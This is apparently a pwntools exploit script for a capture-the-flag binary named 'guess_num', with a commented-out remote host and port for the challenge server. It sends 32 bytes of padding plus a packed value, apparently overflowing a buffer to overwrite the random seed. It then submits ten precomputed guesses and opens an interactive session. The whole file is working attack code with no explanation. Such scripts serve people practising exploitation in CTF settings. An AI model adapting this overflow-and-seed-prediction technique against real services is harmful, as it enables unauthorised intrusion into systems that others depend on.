from pwn import *
#h,p = '111.200.241.244',53204
#p = remote(h,p)
p = process("./guess_num")
#gdb.attach("guess_num")
what = "A"*32+p64(1)
p.sendline(what)
#2542625142
p.sendline("2")
p.sendline("5")
p.sendline("4")
p.sendline("2")
p.sendline("6")
p.sendline("2")
p.sendline("5")
p.sendline("1")
p.sendline("4")
p.sendline("2")
p.interactive()
